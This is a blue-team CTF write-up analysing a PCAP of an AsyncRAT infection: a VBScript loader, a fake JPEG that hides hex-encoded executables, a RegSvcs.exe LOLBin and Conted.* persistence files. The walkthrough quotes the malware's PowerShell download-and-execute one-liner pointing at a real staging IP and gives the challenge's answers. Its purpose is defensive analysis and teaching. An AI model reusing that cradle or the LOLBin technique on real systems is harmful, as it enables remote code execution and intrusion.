# CyberDefenders - XLMRat (PCAP) Write-up

**Challenge:** [XLMRat](https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/)  
**Platform:** [CyberDefenders](https://cyberdefenders.org/)  
**Tags:** Network forensics, Wireshark, AsyncRAT, LOLBin

---

## Summary

Suspicious HTTP traffic from a compromised host pulls a **VBScript loader** (`xlm.txt`) that runs PowerShell and downloads **`mdm.jpg`** — a fake image that is really a script with hex-encoded PE blobs. Rebuilt executable SHA-256 **`1eb7b02e...`** is **AsyncRAT** (Alibaba label). The script runs through **`RegSvcs.exe`** (LOLBin) and drops **`Conted.ps1`**, **`Conted.bat`**, and **`Conted.vbs`** for persistence. Staging server **`45.126.209.4:222`** sits on **ReliableSite.net** hosting.

---

## Scenario

A compromised machine has been flagged due to suspicious network traffic.

Your task is to analyze the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post-compromise.

---

## Objectives

- Extract malware delivery URLs and hosting from the PCAP.
- Deobfuscate loader scripts and recover the embedded executable.
- Identify malware family, timestamps, LOLBin abuse, and persistence files.

---

## Environment

- **Artifact:** XLMRat PCAP (lab package)
- **Tools:** Wireshark, [CyberChef](https://gchq.github.io/CyberChef/), VirusTotal, WHOIS / IP lookup, PowerShell `Get-FileHash`

**Helpful Wireshark steps:**

```text
File → Export Objects → HTTP          # pull xlm.txt, mdm.jpg
Follow → HTTP Stream                  # read loader + stage-2 script
http.request.uri contains "mdm.jpg"   # find download request
```

---

## Evidence & Findings

### T1 — First-stage malware URL

**Question:** The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?

- **What I checked:** Exported HTTP objects from the PCAP — a small text loader plus a “`.jpg`” file that looked wrong for a real image.
- **Evidence:** Opening the loader (`xlm.txt`) and joining its split string fragments reveals a PowerShell one-liner:

  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('http://45.126.209.4:222/mdm.jpg')
  ```

  That command downloads and runs the next stage immediately — no save-to-disk step in between.

- **Reasoning:** The lab asks for the URL of the **first malware stage that gets installed**. The loader is just the delivery mechanism; the actual stage-1 payload is whatever that `DownloadString` pulls — here, **`mdm.jpg`**.

**Answer:** **`http://45.126.209.4:222/mdm.jpg`**

---

### T2 — Hosting provider (WHOIS)

**Question:** Which hosting provider owns the associated IP address?

- **What I checked:** WHOIS / IP ownership lookup for **`45.126.209.4`**.
- **Evidence:** The IP is registered to **ReliableSite.net** (lab accepts **`reliableSite.net`**).
- **Reasoning:** Knowing the host helps with takedown requests and blocking whole provider ranges if the campaign rotates URLs but keeps the same server.

**Answer:** **`reliableSite.net`**

---

### T3 — Malware executable SHA-256

**Question:** By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?

- **What I checked:** Opened **`mdm.jpg`** in a text editor — it is PowerShell, not JPEG data. Two long hex strings start with **`4D 5A`** (the **`MZ`** header of a Windows PE file).
- **Evidence:**
  1. Copy the hex blob(s) into CyberChef → **From Hex** → save as a binary file.
  2. Hash the recovered executable:

     ```powershell
     Get-FileHash extracted.exe -Algorithm SHA256
     ```

     Result: **`1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`**

- **Reasoning:** The script hides a real `.exe` inside hex so it slips past simple “is this an image?” checks. Rebuilding the bytes and hashing them gives you a solid IOC for EDR and VirusTotal.

**Answer:** **`1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`**

---

### T4 — Alibaba malware family label

**Question:** What is the malware family label based on Alibaba?

- **What I checked:** Uploaded the SHA-256 from T3 to **VirusTotal** → **Detection** tab → **Alibaba** engine.
- **Evidence:** Alibaba tags the sample as **AsyncRAT** (full string along the lines of `Backdoor:MSIL/AsyncRat...`).
- **Reasoning:** VT vendor labels are quick family confirmation before you dig into sandbox behavior — Alibaba’s **`asyncrat`** tag matches the RAT-style loader and .NET reflection in the script.

**Answer:** **`asyncrat`**

---

### T5 — Malware creation timestamp

**Question:** What is the timestamp of the malware's creation?

- **What I checked:** VirusTotal → **Details** → **History** → **Creation Time** for the same hash.
- **Evidence:** **`2023-10-30 15:08`** UTC (PE compile / creation timestamp).
- **Reasoning:** Creation time helps place the sample in a campaign timeline and spot related builds from the same actor.

**Answer:** **`2023-10-30 15:08`**

---

### T6 — LOLBin full path

**Question:** Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.

- **What I checked:** End of the **`mdm.jpg`** PowerShell script — obfuscated .NET path with **`#`** characters inserted to break signatures.
- **Evidence:** Strip the **`#`** noise and the path resolves to:

  ```text
  C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
  ```

- **Reasoning:** **`RegSvcs.exe`** is a signed Microsoft binary (a classic LOLBin). Loading malware through it looks like normal .NET activity and avoids spawning an obvious unknown `.exe` from a temp folder.

**Answer:** **`C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`**

---

### T7 — Persistence files dropped

**Question:** The script is designed to drop several files. List the names of the files dropped by the script.

- **What I checked:** Same **`mdm.jpg`** script — file-write / persistence section after the loader logic.
- **Evidence:** The script creates three **`Conted.*`** files for persistence (PowerShell, batch, and VBS wrapper):

  ```text
  Conted.ps1
  Conted.bat
  Conted.vbs
  ```

- **Reasoning:** Attackers often chain **`.vbs`** → **`.bat`** → **`.ps1`** so something survives reboots or user logons even if one layer gets blocked.

**Answer:** **`Conted.ps1`**, **`Conted.bat`**, **`Conted.vbs`**

---

## Key IOCs

| Type | Indicator |
|------|-----------|
| **Staging IP** | `45.126.209.4:222` |
| **Hosting** | ReliableSite.net |
| **Stage-1 URL** | `http://45.126.209.4:222/mdm.jpg` |
| **Loader object** | `xlm.txt` (VBScript) |
| **SHA-256** | `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798` |
| **Family** | AsyncRAT |
| **LOLBin** | `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe` |
| **Persistence** | `Conted.ps1`, `Conted.bat`, `Conted.vbs` |

---

## Attack reconstruction

```text
[Compromised host 10.1.9.101]
    → HTTP GET loader (xlm.txt)
    → VBScript builds PowerShell: DownloadString(mdm.jpg)
    → mdm.jpg = PowerShell + hex-encoded PE (MZ header)
    → RegSvcs.exe (LOLBin) + .NET reflection → AsyncRAT in memory
    → Drops Conted.ps1 / .bat / .vbs for persistence
```

---

## MITRE ATT&CK

| Technique | Name | Lab tie-in |
|-----------|------|------------|
| **T1105** | Ingress Tool Transfer | Download `mdm.jpg` (T1) |
| **T1059.001** | PowerShell | Loader + stage-2 script |
| **T1059.005** | Visual Basic | `xlm.txt` VBScript loader |
| **T1027** | Obfuscated Files | Hex PE, `#` in paths, split strings |
| **T1218.009** | Regsvcs | RegSvcs.exe LOLBin (T6) |
| **T1547** | Boot or Logon Autostart Execution | Conted.* persistence (T7) |
| **T1219** | Remote Access Software | AsyncRAT (T4) |

---

## Mitigation / hunting

1. Block **`45.126.209.4`** and alert on HTTP to non-standard port **222**.
2. Inspect **`Content-Type: image/jpeg`** responses whose body contains **`MZ`** / PowerShell keywords.
3. EDR: **`RegSvcs.exe`** spawning network activity or loading assemblies from script content.
4. Hunt for **`Conted.ps1`**, **`Conted.bat`**, **`Conted.vbs`** in user profile or startup paths.
5. Hash block **`1eb7b02e...`** and VT rule **`AsyncRat`** across endpoints.

---

## References

- Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/
- MITRE T1218.009: https://attack.mitre.org/techniques/T1218/009/
- CyberChef: https://gchq.github.io/CyberChef/
